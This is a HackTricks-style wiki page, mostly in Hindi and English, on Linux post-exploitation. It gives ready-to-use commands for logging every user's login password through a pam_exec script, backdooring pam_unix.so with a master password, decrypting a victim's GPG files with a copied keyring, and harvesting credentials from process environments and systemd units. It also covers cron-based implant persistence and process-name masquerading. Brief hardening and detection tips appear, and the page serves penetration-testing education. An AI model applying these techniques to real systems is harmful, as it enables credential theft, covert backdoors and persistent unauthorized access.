# Linux Post-Exploitation

{{#include ../../banners/hacktricks-training.md}}

## Sniffing Logon Passwords with PAM

आइए एक PAM मॉड्यूल कॉन्फ़िगर करें ताकि प्रत्येक उपयोगकर्ता द्वारा लॉगिन के दौरान उपयोग किए गए प्रत्येक password को लॉग किया जा सके। अगर आप नहीं जानते कि PAM क्या है तो देखें:


{{#ref}}
pam-pluggable-authentication-modules.md
{{#endref}}

**For further details check the [original post](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)**. This is just a summary:

**Technique Overview:**
Pluggable Authentication Modules (PAM) यूनिक्स-आधारित सिस्टम्स पर authentication को प्रबंधित करने में लचीलापन प्रदान करते हैं। ये login प्रक्रियाओं को customize करके security बढ़ा सकते हैं, लेकिन गलत उपयोग पर जोखिम भी पैदा कर सकते हैं। यह सारांश PAM का उपयोग करके login credentials capture करने की एक technique और साथ में mitigation रणनीतियाँ बताता है।

**Capturing Credentials:**

- `toomanysecrets.sh` नामक एक bash script तैयार की जाती है जो login प्रयासों को लॉग करती है, date, username (`$PAM_USER`), password (stdin के माध्यम से), और remote host IP (`$PAM_RHOST`) को `/var/log/toomanysecrets.log` में रिकॉर्ड करती है।
- स्क्रिप्ट को executable बनाया जाता है और `pam_exec.so` module का उपयोग करके PAM configuration (`common-auth`) में integrate किया जाता है, विकल्पों के साथ कि यह quietly चले और authentication token को स्क्रिप्ट को expose करे।
- यह तरीका दिखाता है कि किस प्रकार compromised Linux host का शोषण कर credentials को गुप्त रूप से लॉग किया जा सकता है।
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
sudo nano /etc/pam.d/common-auth
# Add: auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh
sudo chmod 700 /usr/local/bin/toomanysecrets.sh
```
### Backdooring PAM

**For further details check the [original post](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)**. This is just a summary:

The Pluggable Authentication Module (PAM) is a system used under Linux for user authentication. It operates on three main concepts: **username**, **password**, and **service**. Configuration files for each service are located in the `/etc/pam.d/` directory, where shared libraries handle authentication.

**Objective**: Modify PAM to allow authentication with a specific password, bypassing the actual user password. This is particularly focused on the `pam_unix.so` shared library used by the `common-auth` file, which is included by almost all services for password verification.

### Steps for Modifying `pam_unix.so`:

1. **Locate the Authentication Directive** in the `common-auth` file:
- The line responsible for checking a user's password calls `pam_unix.so`.
2. **Modify Source Code**:
- Add a conditional statement in the `pam_unix_auth.c` source file that grants access if a predefined password is used, otherwise, it proceeds with the usual authentication process.
3. **Recompile and Replace** the modified `pam_unix.so` library in the appropriate directory.
4. **Testing**:
- Access is granted across various services (login, ssh, sudo, su, screensaver) with the predefined password, while normal authentication processes remain unaffected.

> [!TIP]
> You can automate this process with [https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)

## Decrypting GPG loot via homedir relocation

यदि आप एक encrypted `.gpg` फाइल और उपयोगकर्ता का `~/.gnupg` फ़ोल्डर (pubring, private-keys, trustdb) पाते हैं लेकिन GnuPG homedir permissions/locks के कारण डिक्रिप्ट नहीं कर पा रहे हैं, तो keyring को एक writable location में कॉपी करें और इसे अपने GPG home के रूप में उपयोग करें।

Typical errors you’ll see without this: "unsafe ownership on homedir", "failed to create temporary file", or "decryption failed: No secret key" (because GPG can’t read/write the original homedir).

Workflow:
```bash
# 1) Stage a writable homedir and copy the victim's keyring
mkdir -p /dev/shm/fakehome/.gnupg
cp -r /home/victim/.gnupg/* /dev/shm/fakehome/.gnupg/
# 2) Ensure ownership & perms are sane for gnupg
chown -R $(id -u):$(id -g) /dev/shm/fakehome/.gnupg
chmod 700 /dev/shm/fakehome/.gnupg
# 3) Decrypt using the relocated homedir (either flag works)
GNUPGHOME=/dev/shm/fakehome/.gnupg gpg -d /home/victim/backup/secrets.gpg
# or
gpg --homedir /dev/shm/fakehome/.gnupg -d /home/victim/backup/secrets.gpg
```
यदि secret key material `private-keys-v1.d` में मौजूद है, तो GPG बिना passphrase के पूछे unlock और decrypt कर देगा (या यदि key protected है तो यह prompt करेगा)।

## प्रोसेस के environment से credentials इकट्ठा करना (containers शामिल)

जब आप किसी service के अंदर code execution हासिल कर लेते हैं, तो process को अक्सर संवेदनशील environment variables विरासत में मिल जाते हैं। ये lateral movement के लिए एक सोने की खान हैं।

Quick wins
- अपने वर्तमान process env को dump करें: `env` या `printenv`
- किसी दूसरे process का env dump करें: `tr '\0' '\n' </proc/<PID>/environ | sed -n '1,200p'`
- यदि `tr`/`sed` उपलब्ध नहीं हैं तो `strings -z /proc/<PID>/environ` जोड़ें
- containers में PID 1 भी जांचें: `tr '\0' '\n' </proc/1/environ`

क्या देखें
- App secrets और admin creds (उदाहरण के लिए, Grafana `GF_SECURITY_ADMIN_USER`, `GF_SECURITY_ADMIN_PASSWORD` सेट करती है)
- API keys, DB URIs, SMTP creds, OAuth secrets
- Proxy और TLS overrides: `http_proxy`, `https_proxy`, `SSL_CERT_FILE`, `SSL_CERT_DIR`

नोट्स
- कई orchestrations संवेदनशील सेटिंग्स env के माध्यम से पास करती हैं; ये children द्वारा inherited हो जाती हैं और process context के अंदर आप जो भी arbitrary shell spawn करते हैं उसे एक्सपोज़ कर देती हैं।
- कुछ मामलों में, वे creds system-wide reuse किए जाते हैं (उदा., वही username/password host पर SSH के लिए मान्य होता है), जिससे एक आसान pivot संभव होता है।

## unit files में systemd द्वारा स्टोर किए गए credentials (Environment=)

systemd द्वारा लॉन्च की गई services unit files में `Environment=` एंट्री के रूप में credentials संग्रहीत हो सकती हैं। इन्हें सूचीबद्ध करके निकालें:
```bash
# Unit files and drop-ins
ls -la /etc/systemd/system /lib/systemd/system
# Grep common patterns
sudo grep -R "^Environment=.*" /etc/systemd/system /lib/systemd/system 2>/dev/null | sed 's/\x00/\n/g'
# Example of a root-run web panel
# [Service]
# Environment="BASIC_AUTH_USER=root"
# Environment="BASIC_AUTH_PWD=<password>"
# ExecStart=/usr/bin/crontab-ui
# User=root
```
ऑपरेशनल आर्टिफैक्ट्स अक्सर पासवर्ड leak कर देते हैं (उदाहरण के लिए, बैकअप स्क्रिप्ट जो `zip -P <pwd>` कॉल करती हैं)। ये मान अक्सर internal web UIs (Basic-Auth) या अन्य सेवाओं में पुन: उपयोग किए जाते हैं।

Hardening
- Secrets को समर्पित secret stores में रखें (`systemd-ask-password`, `EnvironmentFile` with locked perms, or external secret managers)
- Unit files में creds embed करने से बचें; root-only readable drop-in files का उपयोग करें और इन्हें version control से हटा दें
- Tests के दौरान मिले हुए leaked पासवर्ड्स को rotate करें

## Cron-based persistence with loopback mutex

- Implants को कई writable paths (`/tmp`, `/var/tmp`, `/dev/shm`, `/run/lock`) में copy करें और cron entries जैसे `*/5 * * * * /tmp/<bin>` स्थापित करें ताकि वे अन्य जगह से हटाए जाने पर भी respawn कर सकें।
- एक निश्चित loopback पोर्ट (उदा., `127.0.0.1:51125` या `127.0.0.1:52225`) को bind करके **single-instance** execution लागू करें और अगर `bind()` fail हो तो exit करें; `ss -lntp | grep -E '51125|52225'` mutex listener को प्रकट करेगा।
- ऑपरेटर समय-समय पर किसी भी process को mass-kill कर सकते हैं जिसका `cmdline` dropper नाम (उदा., `init_stop`) शामिल हो, इसलिए analysis के दौरान उन नामों का reuse टकराव पैदा कर सकता है; unique filenames चुनें।

## Process masquerading via prctl + argv overwrite

- शॉर्ट process नाम सेट करने के लिए `prctl(PR_SET_NAME, "<label>")` (15-byte `comm` limit) का उपयोग करें, आमतौर पर `init`, ताकि `/proc/<pid>/status` और GUIs एक सामान्य/निरापद लेबल दिखाएँ।
- `/proc/self/cmdline` की length और `argv[0]` pointer पढ़ने के बाद इन-मेमोरी `argv[0]` buffer को overwrite करें, NULs से padding करें ताकि `/proc/<pid>/cmdline` और `ps` भी fake label दिखाएँ।
- शिकार करने के लिए `/proc/<pid>/status` में `Name:` की तुलना real executable path से करें और उन processes के द्वारा नियंत्रित loopback mutex listeners ढूँढें जिनके cmdlines छोटे/blank हों।

## References

- [0xdf – HTB Planning (Grafana env creds reuse, systemd BASIC_AUTH)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [0xdf – HTB Environment (GPG homedir relocation to decrypt loot)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [GnuPG Manual – Home directory and GNUPGHOME](https://www.gnupg.org/documentation/manuals/gnupg/GPG-Configuration-Options.html#index-homedir)
- [Inside GoBruteforcer: AI-generated server defaults, weak passwords, and crypto-focused campaigns](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)

{{#include ../../banners/hacktricks-training.md}}
